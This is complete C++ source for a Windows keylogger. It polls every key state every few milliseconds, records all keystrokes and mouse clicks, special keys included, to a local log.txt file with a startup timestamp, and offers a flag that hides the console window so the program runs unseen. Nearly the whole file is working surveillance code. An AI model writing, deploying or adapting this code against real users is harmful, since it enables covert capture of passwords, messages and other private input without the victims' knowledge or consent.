#include <Windows.h>
#include <iostream>
#include <fstream>
#include <chrono>
#include <ctime>
using namespace std;

/*
    Set the value to true to hide the console, false to show it
	If the console is hidden the user will have to close the keylogger by searching its .exe in the task manager
*/
const bool HIDECONSOLE = false;

// Function Prototypes
template <class T>
void writeToFile(T input);
bool specialKeys(int S_Key);
void logTime();
void checkForLowerCase(int &key);

int main()
{
	if (HIDECONSOLE)
	{
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	}
	else
	{
		ShowWindow(GetConsoleWindow(), SW_NORMAL);
	}

	// To write the time at startup to the log.txt file
	logTime();

	while (true)
	{
		// 5ms delay
		Sleep(5);

		// Checks all the keys to see which one is pressed
		for (int KEY = 1; KEY <= 222; KEY++)
		{
			// GetAsyncKeyState() determines whether a key is pressed or not.
			if (GetAsyncKeyState(KEY) == -32767)
			{
				cout << KEY;
				if (specialKeys(KEY) == false)
				{
					checkForLowerCase(KEY);
					writeToFile(char(KEY));
				}
			}
		}
	}

	return 0;
}

/*
	Method: writeToFile(T input)
	Parameters: input - represents the the character or string that is going to be written into the file
	Return Values: None
	Purpose: To save the user's written characters and special actions into the log.txt file
*/
template <class T>
void writeToFile(T input)
{
	fstream LogFile;
	LogFile.open("./log.txt", fstream::app);
	if (LogFile.is_open())
	{
		LogFile << input;
		LogFile.close();
	}
}

/*
	Method: specialKeys(int specialKey)
	Parameters: specialKey - an int that represents the virtual-key code used by the system
	Return Values: true - if the virtual-key code is a special key; false - if the virtual-key code is not a special key
	Purpose: To write special keys into the log.txt file if found.
*/
bool specialKeys(int specialKey)
{
	switch (specialKey)
	{
		case VK_LBUTTON:
			cout << "[LEFT_CLICK]";
			writeToFile("[LEFT_CLICK]");
			return true;
		case VK_RBUTTON:
			cout << "[RIGHT_CLICK]";
			writeToFile("[RIGHT_CLICK]");
			return true;
		case VK_MBUTTON:
			cout << "[MIDDLE_CLICK]";
			writeToFile("[MIDDLE_CLICK]");
			return true;
		case VK_XBUTTON1:
			cout << "[MSIDE_BUTTON1]";
			writeToFile("[MSIDE_BUTTON1]");
			return true;
		case VK_XBUTTON2:
			cout << "[MSIDE_BUTTON2]";
			writeToFile("[MSIDE_BUTTON2]");
			return true;
		case VK_BACK:
			cout << "[BACKSPACE]";
			writeToFile("[BACKSPACE]");
			return true;
		case VK_TAB:
			cout << "[TAB]";
			writeToFile("[TAB]");
			return true;
		case VK_CLEAR:
			cout << "[CLEAR]";
			writeToFile("[CLEAR]");
			return true;
		case VK_RETURN:
			cout << "[ENTER]\n";
			writeToFile("[ENTER]\n");
			return true;

		case VK_SHIFT:
			cout << "[SHIFT]";
			writeToFile("[SHIFT]");
			return true;
		case VK_LSHIFT:
		case VK_RSHIFT:
			return true;

		case VK_CONTROL:
			cout << "[CONTROL]";
			writeToFile("[CONTROL]");
			return true;
		case VK_LCONTROL:
		case VK_RCONTROL:
			return true;

		case VK_MENU:
			cout << "[ALT]";
			writeToFile("[ALT]");
			return true;
		case VK_LMENU:
		case VK_RMENU:
			return true;



		case VK_PAUSE:
			cout << "[PAUSE]";
			writeToFile("[PAUSE]");
			return true;
		case VK_CAPITAL:
			cout << "[CAPS_LOCK]";
			writeToFile("[CAPS_LOCK]");
			return true;
		case VK_ESCAPE:
			cout << "[ESCAPE]";
			writeToFile("[ESCAPE]");
			return true;
		case VK_SPACE:
			cout << "[SPACE]";
			writeToFile(" ");
			return true;
		case VK_PRIOR:
			cout << "[PG_UP]";
			writeToFile("[PG_UP]");
			return true;
		case VK_NEXT:
			cout << "[PG_DOWN]";
			writeToFile("[PG_DOWN]");
			return true;
		case VK_END:
			cout << "[END]";
			writeToFile("[END]");
			return true;
		case VK_HOME:
			cout << "[HOME]";
			writeToFile("[HOME]");
			return true;
		case VK_LEFT:
			cout << "[LEFT_ARROW]";
			writeToFile("[LEFT_ARROW]");
			return true;
		case VK_UP:
			cout << "[UP_ARROW]";
			writeToFile("[UP_ARROW]");
			return true;
		case VK_RIGHT:
			cout << "[RIGHT_ARROW]";
			writeToFile("[RIGHT_ARROW]");
			return true;
		case VK_DOWN:
			cout << "[DOWN_ARROW]";
			writeToFile("[DOWN_ARROW]");
			return true;
		case VK_SELECT:
			cout << "[SELECT]";
			writeToFile("[SELECT]");
			return true;
		case VK_PRINT:
			cout << "[PRINT]";
			writeToFile("[PRINT]");
			return true;
		case VK_EXECUTE:
			cout << "[EXECUTE]";
			writeToFile("[EXECUTE]");
			return true;
		case VK_SNAPSHOT:
			cout << "[PRINTSCREEN]";
			writeToFile("[PRINTSCREEN]");
			return true;
		case VK_INSERT:
			cout << "[INSERT]";
			writeToFile("[INSERT]");
			return true;
		case VK_DELETE:
			cout << "[DELETE]";
			writeToFile("[DELETE]");
			return true;
		case VK_HELP:
			cout << "[HELP]";
			writeToFile("[HELP]");
			return true;
		case VK_LWIN:
			cout << "[WINDOWS_KEY]";
			writeToFile("[WINDOWS_KEY]");
			return true;
		case VK_RWIN:
			cout << "[WINDOWS_KEY]";
			writeToFile("[WINDOWS_KEY]");
			return true;
		case VK_APPS:
			cout << "[APP_KEY]";
			writeToFile("[APP_KEY]");
			return true;
		case VK_SLEEP:
			cout << "[SLEEP]";
			writeToFile("[SLEEP]");
			return true;
		case VK_NUMPAD0:
			cout << "[NUMPAD_0]";
			writeToFile("[NUMPAD_0]");
			return true;
		case VK_NUMPAD1:
			cout << "[NUMPAD_1]";
			writeToFile("[NUMPAD_1]");
			return true;
		case VK_NUMPAD2:
			cout << "[NUMPAD_2]";
			writeToFile("[NUMPAD_2]");
			return true;
		case VK_NUMPAD3:
			cout << "[NUMPAD_3]";
			writeToFile("[NUMPAD_3]");
			return true;
		case VK_NUMPAD4:
			cout << "[NUMPAD_4]";
			writeToFile("[NUMPAD_4]");
			return true;
		case VK_NUMPAD5:
			cout << "[NUMPAD_5]";
			writeToFile("[NUMPAD_5]");
			return true;
		case VK_NUMPAD6:
			cout << "[NUMPAD_6]";
			writeToFile("[NUMPAD_6]");
			return true;
		case VK_NUMPAD7:
			cout << "[NUMPAD_7]";
			writeToFile("[NUMPAD_7]");
			return true;
		case VK_NUMPAD8:
			cout << "[NUMPAD_8]";
			writeToFile("[NUMPAD_8]");
			return true;
		case VK_NUMPAD9:
			cout << "[NUMPAD_9]";
			writeToFile("[NUMPAD_9]");
			return true;
		case VK_MULTIPLY:
			cout << "[MULTIPLY]";
			writeToFile("[MULTIPLY]");
			return true;
		case VK_ADD:
			cout << "[ADD]";
			writeToFile("[ADD]");
			return true;
		case VK_SEPARATOR:
			cout << "[SEPARATOR]";
			writeToFile("[SEPARATOR]");
			return true;
		case VK_SUBTRACT:
			cout << "[SUBSTRACT]";
			writeToFile("[SUBSTRACT]");
			return true;
		case VK_DECIMAL:
			cout << "[DECIMAL]";
			writeToFile("[DECIMAL]");
			return true;
		case VK_DIVIDE:
			cout << "[DIVIDE]";
			writeToFile("[DIVIDE]");
			return true;
		case VK_F1:
			cout << "[F1]";
			writeToFile("[F1]");
			return true;
		case VK_F2:
			cout << "[F2]";
			writeToFile("[F2]");
			return true;
		case VK_F3:
			cout << "[F3]";
			writeToFile("[F3]");
			return true;
		case VK_F4:
			cout << "[F4]";
			writeToFile("[F4]");
			return true;
		case VK_F5:
			cout << "[F5]";
			writeToFile("[F5]");
			return true;
		case VK_F6:
			cout << "[F6]";
			writeToFile("[F6]");
			return true;
		case VK_F7:
			cout << "[F7]";
			writeToFile("[F7]");
			return true;
		case VK_F8:
			cout << "[F8]";
			writeToFile("[F8]");
			return true;
		case VK_F9:
			cout << "[F9]";
			writeToFile("[F9]");
			return true;
		case VK_F10:
			cout << "[F10]";
			writeToFile("[F10]");
			return true;
		case VK_F11:
			cout << "[F11]";
			writeToFile("[F11]");
			return true;
		case VK_F12:
			cout << "[F12]";
			writeToFile("[F12]");
			return true;
		case VK_NUMLOCK:
			cout << "[NUMLOCK]";
			writeToFile("[NUMLOCK]");
			return true;
		case VK_SCROLL:
			cout << "[SCROLL_LOCK]";
			writeToFile("[SCROLL_LOCK]");
			return true;
		case VK_OEM_1:
			cout << ";";
			writeToFile(";");
			return true;
		case VK_OEM_PLUS:
			cout << "=";
			writeToFile("=");
			return true;
		case VK_OEM_COMMA:
			cout << ",";
			writeToFile(",");
			return true;
		case VK_OEM_MINUS:
			cout << "-";
			writeToFile("-");
			return true;
		case VK_OEM_PERIOD:
			cout << ".";
			writeToFile(".");
			return true;
		case VK_OEM_2:
			cout << "/";
			writeToFile("/");
			return true;
		case VK_OEM_3:
			cout << "`";
			writeToFile("`");
			return true;
		case VK_OEM_4:
			cout << "[";
			writeToFile("[");
			return true;
		case VK_OEM_5:
			cout << "\\";
			writeToFile("\\");
			return true;
		case VK_OEM_6:
			cout << "]";
			writeToFile("]");
			return true;
		case VK_OEM_7:
			cout << "'";
			writeToFile("'");
			return true;

		default:
			return false;
	}
}

/*
	Method: logTime()
	Parameters: None
	Return Values: None
	Purpose: To write the current time to the log.txt file
*/
void logTime()
{
	char time[30];
	auto currentTime = chrono::system_clock::to_time_t(chrono::system_clock::now());
	ctime_s(time, sizeof(time), &currentTime);
	writeToFile("\n========================\n");
	writeToFile(time);
	writeToFile("========================\n");
}

/*
	Method: checkForLowerCase(int &key)
	Parameters: key - represent an alphanumeric character
	Return Values: Set the passed variable to lowercase when suitable
	Purpose: To convert uppercase characters to lowercase characters when suitable
*/
void checkForLowerCase(int &key)
{
	// Capslock is toggled when the low-order bit is 1
	bool capslockPressed = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

	// Shift is pressed when the high-order bit is 1
	bool shiftPressed = ((GetKeyState(VK_SHIFT) & 0x8000) != 0);

	// Converts uppercase character to lowercase
	if (!capslockPressed && !shiftPressed) // When capslock and shift are not pressed
	{
		key = int(tolower(char(key)));
	}
	else if (capslockPressed && shiftPressed) // When capslock and shift are pressed
	{
		key = int(tolower(char(key)));
	}
}
